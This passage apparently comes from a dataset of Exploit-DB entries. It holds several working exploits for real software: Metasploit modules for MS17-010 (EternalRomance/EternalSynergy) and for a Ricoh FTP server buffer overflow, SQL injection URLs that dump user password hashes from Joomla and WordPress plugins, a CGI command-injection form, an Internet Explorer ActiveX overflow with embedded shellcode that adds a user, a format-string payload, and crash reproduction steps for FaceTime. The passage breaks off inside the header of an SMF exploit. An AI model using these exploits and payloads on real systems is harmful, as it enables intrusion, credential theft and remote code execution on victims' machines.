EternalChampion, and EternalSynergy         exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a         named pipe.       },       'Author'         =>         [           'sleepya',          # zzz_exploit idea and offsets           'zerosum0x0',           'Shadow Brokers',           'Equation Group'         ],       'License'        => MSF_LICENSE,       'DefaultOptions' =>         {           'WfsDelay'     => 10,           'EXITFUNC' => 'thread'         },       'References'     =>         [           [ 'AKA', 'ETERNALSYNERGY' ],           [ 'AKA', 'ETERNALROMANCE' ],           [ 'AKA', 'ETERNALCHAMPION' ],           [ 'AKA', 'ETERNALBLUE'],  # does not use any CVE from Blue, but Search should show this, it is preferred           [ 'MSB', 'MS17-010' ],           [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests           [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests           [ 'CVE', '2017-0147'], # for EternalRomance reference           [ 'URL', 'https://github.com/worawit/MS17-010' ],           [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],           [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],         ],       'Payload'        =>         {           'Space'        => 3072,           'DisableNops'  => true         },       'Platform'       => 'win',       'Arch'           => [ARCH_X86, ARCH_X64],       'Targets'        =>         [           [ 'Automatic', { } ],           [ 'PowerShell', { } ],           [ 'Native upload', { } ],           [ 'MOF upload', { } ]         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Mar 14 2017'     ))      register_options(       [         OptString.new('SHARE',     [ true, ""The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share"", 'ADMIN$' ])       ])      register_advanced_options(       [         OptBool.new('ALLOW_GUEST', [true, ""Keep trying if only given guest access"", false]),         OptString.new('SERVICE_FILENAME', [false, ""Filename to to be used on target for the service binary"",nil]),         OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']),         OptString.new('SERVICE_STUB_ENCODER', [false, ""Encoder to use around the service registering stub"",nil])       ])   end    def exploit     begin       eternal_pwn(datastore['RHOST'])       smb_pwn()      rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e       print_error(""#{e.message}"")     rescue ::Errno::ECONNRESET,            ::Rex::Proto::SMB::Exceptions::LoginError,            ::Rex::HostUnreachable,            ::Rex::ConnectionTimeout,            ::Rex::ConnectionRefused  => e       print_error(""#{e.class}: #{e.message}"")     rescue => error       print_error(error.class.to_s)       print_error(error.message)       print_error(error.backtrace.join(""\n""))     ensure       eternal_cleanup()       # restore session     end   end    def smb_pwn()     case target.name     when 'Automatic'       if powershell_installed?         print_status('Selecting PowerShell target')         powershell       else         print_status('Selecting native target')         native_upload       end     when 'PowerShell'       powershell     when 'Native upload'       native_upload     when 'MOF upload'       mof_upload     end      handler   end     # TODO: Again, shamelessly copypasta from the psexec exploit module. Needs to   #       be moved into a mixin    def powershell_installed?     share = ""\\\\#{datastore['RHOST']}\\#{datastore['SHARE']}""      case datastore['SHARE'].upcase     when 'ADMIN$'       path = 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'     when 'C$'       path = 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'     else       path = datastore['PSH_PATH']     end      simple.connect(share)      vprint_status(""Checking for #{path}"")      if smb_file_exist?(path)       vprint_status('PowerShell found')       psh = true     else       vprint_status('PowerShell not found')       psh = false     end      simple.disconnect(share)      psh   end    def powershell     ENV['MSF_SERVICENAME'] = datastore['SERVICE_NAME']     command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)      if datastore['PSH::persist'] and not datastore['DisablePayloadHandler']       print_warning(""You probably want to DisablePayloadHandler and use exploit/multi/handler with the PSH::persist option"")     end      # Execute the powershell command     print_status(""Executing the payload..."")     begin       psexec(command)     rescue StandardError => exec_command_error       fail_with(Failure::Unknown, ""#{peer} - Unable to execute specified command: #{exec_command_error}"")     end   end    def native_upload     filename = datastore['SERVICE_FILENAME'] || ""#{rand_text_alpha(8)}.exe""     servicename = datastore['SERVICE_NAME'] || rand_text_alpha(8)     serviceencoder = datastore['SERVICE_STUB_ENCODER'] || ''      # Upload the shellcode to a file     print_status(""Uploading payload..."")     smbshare = datastore['SHARE']     fileprefix = """"     # if SHARE = Users/sasha/ or something like this     if smbshare =~ /.[\\\/]/       subfolder = true       smbshare = datastore['SHARE'].dup       smbshare = smbshare.gsub(/^[\\\/]/,"""")       folder_list = smbshare.split(/[\\\/]/)       smbshare = folder_list[0]       fileprefix = folder_list[1..-1].map {|a| a + ""\\""}.join.gsub(/\\$/,"""") if folder_list.length > 1       simple.connect(""\\\\#{datastore['RHOST']}\\#{smbshare}"")       fd = smb_open(""\\#{fileprefix}\\#{filename}"", 'rwct')     else       subfolder = false       simple.connect(""\\\\#{datastore['RHOST']}\\#{smbshare}"")       fd = smb_open(""\\#{filename}"", 'rwct')     end     exe = ''     opts = { :servicename => servicename, :serviceencoder => serviceencoder}     begin       exe = generate_payload_exe_service(opts)        fd << exe     ensure       fd.close     end      if subfolder       print_status(""Created \\#{fileprefix}\\#{filename}..."")     else       print_status(""Created \\#{filename}..."")     end      # Disconnect from the share     simple.disconnect(""\\\\#{datastore['RHOST']}\\#{smbshare}"")      # define the file location     if datastore['SHARE'] == 'ADMIN$'       file_location = ""%SYSTEMROOT%\\#{filename}""     elsif datastore['SHARE'] =~ /^[a-zA-Z]\$$/       file_location = datastore['SHARE'].slice(0,1) +  "":\\#{filename}""     else       file_location = ""\\\\127.0.0.1\\#{smbshare}\\#{fileprefix}\\#{filename}""     end      psexec(file_location, false)      unless datastore['SERVICE_PERSIST']       print_status(""Deleting \\#{filename}..."")       #This is not really useful but will prevent double \\ on the wire :)       if datastore['SHARE'] =~ /.[\\\/]/         simple.connect(""\\\\#{datastore['RHOST']}\\#{smbshare}"")         begin           simple.delete(""\\#{fileprefix}\\#{filename}"")         rescue XCEPT::ErrorCode => e           print_error(""Delete of \\#{fileprefix}\\#{filename} failed: #{e.message}"")         end       else         simple.connect(""\\\\#{datastore['RHOST']}\\#{smbshare}"")         begin           simple.delete(""\\#{filename}"")         rescue XCEPT::ErrorCode => e           print_error(""Delete of \\#{filename} failed: #{e.message}"")         end       end     end   end    def mof_upload     share = ""\\\\#{datastore['RHOST']}\\ADMIN$""     filename = datastore['SERVICE_FILENAME'] || ""#{rand_text_alpha(8)}.exe""      # payload as exe     print_status(""Trying wbemexec..."")     print_status(""Uploading Payload..."")     if datastore['SHARE'] != 'ADMIN$'       print_error('Wbem will only work with ADMIN$ share')       return     end     simple.connect(share)     exe = generate_payload_exe     fd = smb_open(""\\system32\\#{filename}"", 'rwct')     fd << exe     fd.close     print_status(""Created %SystemRoot%\\system32\\#{filename}"")      # mof to cause execution of above     mofname = rand_text_alphanumeric(14) + "".MOF""     mof = generate_mof(mofname, filename)     print_status(""Uploading MOF..."")     fd = smb_open(""\\system32\\wbem\\mof\\#{mofname}"", 'rwct')     fd << mof     fd.close     print_status(""Created %SystemRoot%\\system32\\wbem\\mof\\#{mofname}"")      # Disconnect from the ADMIN$     simple.disconnect(share)   end    def report_auth     service_data = {         address: ::Rex::Socket.getaddress(datastore['RHOST'],true),         port: datastore['RPORT'],         service_name: 'smb',         protocol: 'tcp',         workspace_id: myworkspace_id     }      credential_data = {         origin_type: :service,         module_fullname: self.fullname,         private_data: datastore['SMBPass'],         username: datastore['SMBUser'].downcase     }      if datastore['SMBDomain'] and datastore['SMBDomain'] != 'WORKGROUP'       credential_data.merge!({         realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,         realm_value: datastore['SMBDomain']        })     end      if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/       credential_data.merge!({:private_type => :ntlm_hash})     else       credential_data.merge!({:private_type => :password})     end      credential_data.merge!(service_data)      credential_core = create_credential(credential_data)      login_data = {         access_level: 'Admin',         core: credential_core,         last_attempted_at: DateTime.now,         status: Metasploit::Model::Login::Status::SUCCESSFUL     }      login_data.merge!(service_data)     create_credential_login(login_data)   end end",Windows XP systems,1
14488,"Joomla! Component com_appointinator 1.0.1 - Multiple Vulnerabilities Appointinator 1.0.1 Joomla Component Multiple Remote Vulnerabilities   Name              Appointinator  Vendor            http://appointinator.chemeia.info  Versions Affected 1.0.1   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2010-07-27  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX    I. ABOUT THE APPLICATION ________________________  Appointinator is a small and convenient component,  that allows  you  to   start   appointment   polls  for  your registered users.   II. DESCRIPTION _______________  Some parameters  are not properly sanitised before being used in SQL queries.  These  bugs  can be exploited from registered users.   III. ANALYSIS _____________  Summary:   A) SQL Injection  B) Blind SQL Injection    A) SQL Injection ________________  The parameter  aid passed to app.php when view is set to App is not properly sanitised before being used in a SQL query.  This can  be exploited to manipulate SQL queries by injecting arbitrary SQL code.   B) Blind SQL Injection ______________________  The parameter aid passed to app.php via POST in the vote form  is  not  properly sanitised before being used in a SQL query by the store function. This can  be  exploited to  manipulate  SQL  queries  by injecting arbitrary SQL code.   IV. SAMPLE CODE _______________  A) SQL Injection  http://site/path/index.php?option=com_appointinator&view=App&aid=-1 UNION SELECT 1,CONCAT(username,0x3A,password),3,4,5,6 FROM jos_users   V. FIX ______  No fix.",Joomla! Component com_appointinator,1
20503,"Leif M. Wright simplestmail.cgi 1.0 - Remote Command Execution source: https://www.securityfocus.com/bid/2102/info  A vulnerabiliy exists in Leif M. Wright's simplestmail.cgi, a script designed to coordinate email responses from web forms.  An insecurely-structured call to the open() function leads to a failure to properly filter shell metacharacters from user supplied input. As a result, it is possible for an attacker to cause this script to execute arbitrary shell commands with the privilege of the webserver.   <html> <form action=""http://someplace/cgi-bin/simplestmail.cgi"" method=POST> Command: <input type=text name=MyEmail value="";""> <input type=hidden name=redirect value=""http://goatse.cx""> <input type=submit name=submit value=""run""> </form> </html>",Leif M. Wright simplestmail.cgi,1
14175,"Mp3 Digitalbox 2.7.2.0 - '.mp3' Local Stack Overflow (PoC) #!/usr/bin/perl  # Mp3 Digitalbox 2.7.2.0 (.mp3) Local Stack Overflow POC # Author	: v3n0m # Site		: http://yogyacarderlink.web.id/ # Group		: YOGYACARDERLINK # Date		: July, 02-2010 [INDONESIA] # Software	: Mp3 Digitalbox # Version	: 2.7.2.0 Other versions may also be affected # Download	: http://www.tsoft.aplus.pl/ # Greetz	: All Yogyacarderlink & devilzc0de Crews sub clear{ system(($^O eq 'MSWin32') ? 'cls' : 'clear'); } clear(); print ""|-----------------------------------------------------------|\n""; print ""|   Mp3 Digitalbox 2.7.2.0 (.mp3) Local Stack Overflow POC  |\n""; print ""| Created  : v3n0m                                          |\n""; print ""| E-mail   : v3n0m666[at]live[dot]com                       |\n""; print ""|                                                           |\n""; print ""|                                                           |\n""; print ""|                                 www.yogyacarderlink.web.id|\n""; print ""|-----------------------------------------------------------|\n""; print "" Usage: Run this c0de, load file and bo0om!!\n\n""; my $fuck = ""\x41"" x 500; my $file = ""jovita.mp3""; open (FILE,"">$file"") or die ""[!]Cannot open file""; print FILE ""$fuck""; print ""\nFile successfully created!\n"";",Mp3 Digitalbox,1
43901,"WordPress Plugin Learning Management System - 'course_id' SQL Injection # Exploit Title: Good LMS - Learning Management System WP Plugin SQL  Injection # Date: 2018-01-24 # Exploit Author: Esecurity.ir # Exploit Author Web Site: http://esecurity.ir # Special Thanks : Meisam Monsef [meisamrce@gmail.com] - Telegram ID :  @meisamrce # Vendor Homepage: https://goodlayers.com/ # Version: All Version  Exploit :  	1 - First enter the link below and create an account 	http://target.com/?register=1 	2 - the exploit 	http://target.com/author/[your-username]/?type=scoring-status-student&course_id=-999999+[SQL+Command]%23 	http://target.com/author/[your-username]/?type=scoring-status-student&course_id=-999999+union+select+1,2,3,user()%23",WordPress Plugin Learning Management System,1
45788,"FaceTime - 'VCPDecompressionDecodeFrame' Memory Corruption There is a heap corruption vulnerability in VCPDecompressionDecodeFrame which is called by FaceTime. This bug can be reached if a user accepts a call from a malicious peer.  The issue can be reproduced using the attached sequence of RTP packets. To reproduce the issue:      1) Build video-replay.c attached (gcc -g -dynamiclib -o mylib video-replay.c) and copy to /usr/lib/mylib     2) Use bspatch to apply the attached binpatch to /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference. The version I patched has an md5 sum of 0de78198e29ae43e686f59d550150d1b and the patched version has an md5 sum of af5bb770f08e315bf471a0fadcf96cf8. This patch alters SendRTP to retrieve the length of an encrypted packet from offset 0x650 of the encrypted buffer, as the existing code doesn't respect the output size returned from CCCryptorUpdate     3) Use insert_dylib (https://github.com/Tyilo/insert_dylib) to add /usr/lib/mylib to AVConference (insert_dylib --strip-codesig /usr/lib/mylib AVConference)     4) Edit /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb to add /out as allow file read and write     5) Restart the machine     6) Extract the attached out.zip to /out and change the permissions so it's readable by AVConference     7) Call target, when they pick up, AVConference will crash  When I reproduced this, my host was a Mac mini running version 10.13.6. My target was a MacBook Pro running 10.13.6. This PoC only works on a Mac, but the vulnerable code appears to be in iOS 11.3.1 as well.  * thread #27, name = 'com.apple.avconference.soundplayer.recvproc', stop reason = EXC_BAD_ACCESS (code=1, address=0x21c6a1ff6)     frame #0: 0x00007fff6bd71892 VideoProcessing`___lldb_unnamed_symbol2778$$VideoProcessing + 4492 VideoProcessing`___lldb_unnamed_symbol2778$$VideoProcessing: ->  0x7fff6bd71892 <+4492>: movl   (%rcx,%rbx), %r8d     0x7fff6bd71896 <+4496>: bswapl %r8d     0x7fff6bd71899 <+4499>: movl   %eax, %ecx     0x7fff6bd7189b <+4501>: shll   %cl, %r8d Target 0: (avconferenced) stopped. (lldb) bt * thread #27, name = 'com.apple.avconference.soundplayer.recvproc', stop reason = EXC_BAD_ACCESS (code=1, address=0x21c6a1ff6)   * frame #0: 0x00007fff6bd71892 VideoProcessing`___lldb_unnamed_symbol2778$$VideoProcessing + 4492     frame #1: 0x00007fff6bd976b6 VideoProcessing`___lldb_unnamed_symbol3007$$VideoProcessing + 117     frame #2: 0x00007fff6bda4eb9 VideoProcessing`___lldb_unnamed_symbol3043$$VideoProcessing + 513     frame #3: 0x00007fff6bda4b76 VideoProcessing`___lldb_unnamed_symbol3042$$VideoProcessing + 560     frame #4: 0x00007fff6bd6b252 VideoProcessing`___lldb_unnamed_symbol2741$$VideoProcessing + 4206     frame #5: 0x00007fff53cf67f4 VideoToolbox`___lldb_unnamed_symbol79$$VideoToolbox + 1233     frame #6: 0x00007fff53cf5373 VideoToolbox`___lldb_unnamed_symbol59$$VideoToolbox + 401     frame #7: 0x00007fff6bca7381 VideoProcessing`VCPDecompressionSessionDecodeFrame + 423     frame #8: 0x000000010bb86bab AVConference`VideoPlayer_ShowFrame + 1384     frame #9: 0x000000010bb8cf98 AVConference`VideoReceiver_ShowFrame + 740     frame #10: 0x000000010bb8c5be AVConference`VideoReceiver_VideoAlarm + 720     frame #11: 0x000000010bb78933 AVConference`SoundPlayer_AlarmThread + 364     frame #12: 0x00007fff484fe98b CoreMedia`figThreadMain + 277     frame #13: 0x00007fff6f6a6661 libsystem_pthread.dylib`_pthread_body + 340     frame #14: 0x00007fff6f6a650d libsystem_pthread.dylib`_pthread_start + 377     frame #15: 0x00007fff6f6a5bf9 libsystem_pthread.dylib`thread_start + 13  I've improved the PoC a lot for this, an updated video-replay.c is attached.  This version does not require the binary patch for the sender binary, other than adding the library with insert_dylib. So to use this one:  1) Build video-replay.c attached (g++ -std=c++11 -g -dynamiclib -o mylib video-replay.c) and copy to /usr/lib/mylib 2) Use insert_dylib (https://github.com/Tyilo/insert_dylib) to add /usr/lib/mylib to AVConference (insert_dylib --strip-codesig /usr/lib/mylib AVConference) 3) Edit /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb to add /out as allow file read and write 4) Restart the machine 5) Extract the attached out.zip to /out and change the permissions so it's readable by AVConference 6) Call target with FaceTime, when they pick up, AVConference will crash   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45788.zip",FaceTime,1
38111,"WordPress Plugin Simple Gmail Login - Stack Trace Information Disclosure source: https://www.securityfocus.com/bid/56860/info  The Simple Gmail Login plugin for Wordpress is prone to an information-disclosure vulnerability.  Attackers can exploit this issue to obtain sensitive information that may lead to further attacks.  Simple Gmail Login 1.1.3 and prior are vulnerable.  Fatal error: Uncaught exception 'Exception' with message 'DateTimeZone::__construct() [<a href='datetimezone.--construct'>datetimezone.--construct</a>]: Unknown or bad timezone ()' in C:\xampp\htdocs\wordpress\wp-content\plugins\simple-gmail-login\simple-gmail-login.php:229 Stack trace: #0 C:\xampp\htdocs\wordpress\wp-content\plugins\simple-gmail-login\simple-gmail-login.php(229):  DateTimeZone->__construct('') #1 C:\xampp\htdocs\wordpress\wp-content\plugins\simple-gmail-login\simple-gmail-login.php(210):  SimpleGmail_Plugin->log('Plugin activate...', false) #2 [internal function]: SimpleGmail_Plugin->activate('') #3 C:\xampp\htdocs\wordpress\wp-includes\plugin.php(403):  call_user_func_array(Array, Array) #4 C:\xampp\htdocs\wordpress\wp-admin\plugins.php(157):  do_action('activate_simple...') #5 {main} thrown in C:\xampp\htdocs\wordpress\wp-content\plugins\simple-gmail-login\simple-gmail-login.php on line 229",WordPress Plugin Simple Gmail Login,1
3966,"Pegasus ImagN - ActiveX Control Remote Buffer Overflow <!- IE 6 / Pegasus ImagN' ActiveX Control (IMW32O40.OCX V4.00.041) remote buffer overflow exploit windows xp sp2 it version / eip overwrite method by rgod site: http://retrogod.altervista.org mail: retrog at alice dot it  software site: http://www.pegasusimaging.com/ info/download locations:http://www.google.com/search?hl=en&q=PEGASUS+IMAGN  this exploits the Filename property, seh pointers are also overwritten BeginReport, CreatePictureExA, DefineImage, DefineImageEx, DefineImageFox, CopyBufToClipExA, LoadEx, LoadFox ... (I stopped to search) functions are vulnerable aswell -> <html> <object classid='clsid:5DA9D8E0-5A57-11CF-9E36-00C0930198C0' id='IMW32O40.ImagN'> <?php /* win32_adduser -  PASS=tzu EXITFUNC=seh USER=sun Size=483 Encoder=PexAlphaNum http://metasploit.com */ $shellcode = ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"". ""\x42\x30\x42\x30\x42\x30\x4b\x58\x45\x44\x4e\x43\x4b\x38\x4e\x57"". ""\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x48"". ""\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x43\x4b\x38"". ""\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"". ""\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x33\x46\x35\x46\x42\x46\x50\x45\x47\x45\x4e\x4b\x58"". ""\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x54"". ""\x4b\x38\x4f\x35\x4e\x41\x41\x50\x4b\x4e\x4b\x38\x4e\x51\x4b\x38"". ""\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x42\x46\x50\x43\x4c\x41\x43"". ""\x42\x4c\x46\x46\x4b\x58\x42\x44\x42\x33\x45\x48\x42\x4c\x4a\x57"". ""\x4e\x50\x4b\x38\x42\x54\x4e\x30\x4b\x38\x42\x37\x4e\x41\x4d\x4a"". ""\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x55\x41\x53"". ""\x48\x4f\x42\x36\x48\x55\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x47"". ""\x42\x45\x4a\x36\x42\x4f\x4c\x58\x46\x30\x4f\x45\x4a\x46\x4a\x49"". ""\x50\x4f\x4c\x38\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x4d\x56"". ""\x46\x36\x50\x32\x45\x46\x4a\x47\x45\x56\x42\x52\x4f\x52\x43\x36"". ""\x42\x52\x50\x46\x45\x56\x46\x47\x42\x52\x45\x47\x43\x37\x45\x56"". ""\x44\x57\x42\x42\x43\x57\x45\x47\x50\x56\x42\x52\x46\x47\x4c\x37"". ""\x45\x47\x42\x52\x4f\x42\x41\x34\x46\x34\x46\x54\x42\x42\x48\x42"". ""\x48\x32\x42\x52\x50\x46\x45\x36\x46\x57\x42\x52\x4e\x46\x4f\x36"". ""\x43\x56\x41\x46\x4e\x36\x47\x56\x44\x47\x4f\x36\x45\x57\x42\x37"". ""\x42\x52\x41\x54\x46\x46\x4d\x56\x49\x46\x50\x56\x49\x36\x43\x37"". ""\x46\x47\x44\x37\x41\x56\x46\x47\x4f\x56\x44\x37\x43\x37\x42\x52"". ""\x43\x57\x45\x57\x50\x46\x42\x42\x4f\x32\x41\x34\x46\x54\x46\x54"". ""\x42\x50\x5a""; $eip  = ""\xb5\x09\xc1\x7d""; // call esp mshtml.dll $exploit= str_repeat(""A"",260).$eip.str_repeat(""\x90"",24).$shellcode; echo ""<param name=\""FileName\"" value=\""$exploit\""/>""; ?> </object> </html>  # milw0rm.com [2007-05-21]",Pegasus ImagN,1
29532,"Apple Installer Package 2.1.5 - Filename Format String source: https://www.securityfocus.com/bid/22272/info  Apple Installer is prone to a format-string vulnerability because the application fails to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.  A successful attack may crash the application or possibly allow the attacker to execute arbitrary code. This may facilitate unauthorized access or privilege escalation in the context of the user running the application.  Apple Installer Version 2.1.5 on Mac OS X 10.4.8 is vulnerable to this issue; other versions may also be affected.   $ touch AAAA`ruby -e 'require ""cgi""; print CGI::escape(""\x9c\xe7\xff\xbf"") + CGI::escape(""%.20d"") + CGI::escape(""%x"" * 20)'`%n.pkg $ open AAAA%9C%E7%FF%BF%25.20d%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%25x%n.pkg",Apple Installer Package,1
18658,"Ricoh DC Software DL-10 SR10 FTP Server (SR10.exe) - FTP USER Command Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Ftp  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow"", 			'Description'    => %q{ 					This module exploits a vulnerability found in Ricoh DC's DL-10 SR10 FTP 				service.  By supplying a long string of data to the USER command, it is 				possible to trigger a stack-based buffer overflow, which allows remote code 				execution under the context of the user.  					Please note that in order to trigger the vulnerability, the server must 				be configured with a log file name (by default, it's disabled). 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Julien Ahrens', #Discovery, PoC 					'sinn3r'         #Metasploit 				], 			'References'     => 				[ 					['OSVDB', '79691'], 					['URL', 'http://secunia.com/advisories/47912'], 					['URL', 'http://www.inshell.net/2012/03/ricoh-dc-software-dl-10-ftp-server-sr10-exe-remote-buffer-overflow-vulnerability/'] 				], 			'Payload'        => 				{ 					# Yup, no badchars 					'BadChars' => ""\x00"", 				}, 			'DefaultOptions'  => 				{ 					'ExitFunction' => ""process"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'Windows XP SP3', 						{ 							'Ret'    => 0x77c35459,  #PUSH ESP; RETN (msvcrt.dll) 							'Offset' => 245 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Mar 1 2012"", 			'DefaultTarget'  => 0))  		# We're triggering the bug via the USER command, no point to have user/pass 		# as configurable options. 		deregister_options('FTPPASS', 'FTPUSER') 	end  	def check 		connect 		disconnect 		if banner =~ /220 DSC ftpd 1\.0 FTP Server/ 			return Exploit::CheckCode::Detected 		else 			return Exploit::CheckCode::Safe 		end 	end  	def exploit 		buf = '' 		buf << rand_text_alpha(target['Offset'], payload_badchars) 		buf << [target.ret].pack('V') 		buf << make_nops(20) 		buf << payload.encoded  		print_status(""#{rhost}:#{rport} - Sending #{self.name}"") 		connect 		send_user(buf) 		handler 		disconnect 	end end  =begin 0:002> lmv m SR10 start    end        module name 00400000 00410000   SR10       (deferred)                  Image path: C:\Program Files\DC Software\SR10.exe     Image name: SR10.exe     Timestamp:        Mon May 19 23:55:32 2008 (483275E4)     CheckSum:         00000000     ImageSize:        00010000     File version:     1.0.0.520     Product version:  1.0.0.0     File flags:       0 (Mask 3F)     File OS:          4 Unknown Win32     File type:        1.0 App     File date:        00000000.00000000     Translations:     0409.04b0     CompanyName:      Ricoh Co.,Ltd.     ProductName:      SR-10     InternalName:     SR-10     OriginalFilename: SR10.EXE     ProductVersion:   1, 0, 0, 0     FileVersion:      1, 0, 0, 520     PrivateBuild:     1, 0, 0, 520     SpecialBuild:     1, 0, 0, 520     FileDescription:  SR-10   Note: No other DC Software dlls are loaded when SR-10.exe is running, so the most stable component we can use is msvcrt.dll for now. =end",Ricoh DC Software DL-10 SR10 FTP Server,1
5826,"Simple Machines Forum (SMF) 1.1.4 - SQL Injection #!/usr/bin/python """""" #=================================================================================================# #                     ____            __________         __             ____  __                  # #                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                # #                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               # #                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 # #                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 # #                              \/\______|      \/     \/                                          # #=================================================================================================# #                                     This was a priv8 Exploit                                    # #=================================================================================================# #  	           		    Simple Machines Forum <= 1.1.4                                # #    		                      Sql Injection Vulnerability    			          # #                                    Priviledge Escalation Exploit              		  # #====================================#===========#====================================#===========# # Server Configuration Requirements  #           # Some Information                   #           # #====================================#		 #====================================#           # #                                                #                                                # # register_globals = 1                           #  Vendor:   www.simplemachines.org              # #                                                #  Author:   The:Paradox                         # #================================================#  Severity: N/A		                  # # 						 #						  # # You may find exploits updates and more 	 #						  # # explanations on =>				 #  Proud To Be Italian.                          # # 	    	http://paradox.altervista.org 	 #  	                 			  # #                                                #                                                # #====================================#===========#================================================# # Board Description		     #								  # #====================================#								  # #												  # # Simple Machines Forum - SMF in short - is a free, professional grade software package that 	  # # allows you to set up your own online community within minutes.				  # # Its powerful custom made template engine puts you in full control of the lay-out of your	  # # message board and with our unique SSI - or Server Side Includes - function you can let your     # # forum and your website interact with each other.						  # # SMF is written in the popular language PHP and uses a MySQL database. It is designed to provide # # you with all the features you need from a bulletin board while having an absolute minimal	  # # impact on the resources of the server. 							  # # SMF is the next generation of forum software - and best of all it is and will always 		  # # remain completely free! 									  # #												  # #====================================#============================================================# # Proof Of Concept / Bug Explanation #                                                            # #====================================#                                                            # # This is a quite old exploit and it is inapplicable on 1.1.5 version and on last 2.0 pre-release # # (that's why I decided to public it). First, let's have a little poc.				  # #=================================================================================================#  [Load.php]  148.	if (isset($db_character_set) && preg_match('~^\w+$~', $db_character_set) === 1) 149.		db_query("" 150.			SET NAMES $db_character_set"", __FILE__, __LINE__);   #=================================================================================================# # In Load.php if $db_character_set is set Smf will execute a Set Names Sql Query.      		  # # Directly from dev.mysql.com let's see what it means.						  # #												  # # ""SET NAMES indicates what character set the client will use to send SQL statements to the       # # the server. Thus, SET NAMES 'cp1251' tells the server future incoming messages from this client # # are in character set cp1251.""									  # #												  # # Ok, now let's see what $db_character_set is.							  # # $db_character_set is a ""Settings.php variable"" written only if a ""Non-Default tick""	          # # is checked during the installation process.							  # # The real vulnerability is when the ""Non-Default tick"" is left unchecked, Smf doesn't write      # # it in ""Settings.php"" and no value is assigned to it: it's possible to set it 			  # # via register_globals.										  # # 												  # # Now the cool poc section =D 									  # # Surely you saw that preg_match avoids any injection of non-alphanumerical chars in the query    # # at line 150 in Load.php 	  								  # # So, how is possible to take advantage of that?						  # # To understand this vulnerability you have to comprehend some character set presents multibyte	  # # characters and they may obiate addslashes() function.		  	  			  # # Addslashes simply adds a backslash (0x5c) before single quote ('), double quote (""), 		  # # backslash (\) and NUL (the NULL byte), without checking if the added blackslash creates 	  # # another char.											  # # No, i'm not going mad :P Here is an example:							  # #												  # # 	   				    Bytes in Input 					  # #	      				        0xa327						  # #												  # #      				       Addslashes(Bytes in Input)				  # #    	     				       0xa35c27						  # # 												  # # In big5, but also in other multibyte charsets, 0xa35c is a valid char: 0x27 (') is left alone.  # # Therefore a lot of smf's queries are vulnerable if $db_character_set is settable.		  # # In this exploit i will inject sql code in Update syntax, increasing user's privledges.	  # #=================================================================================================# # Exploit tested on 1.1.3 and 1.1.4 Smf's versions. 						  # #=================================================================================================# # Use this exploit at your own risk. You are responsible for your own deeds.                      # #=================================================================================================# #                                      Python Exploit Starts                                      # #=================================================================================================# """""" from 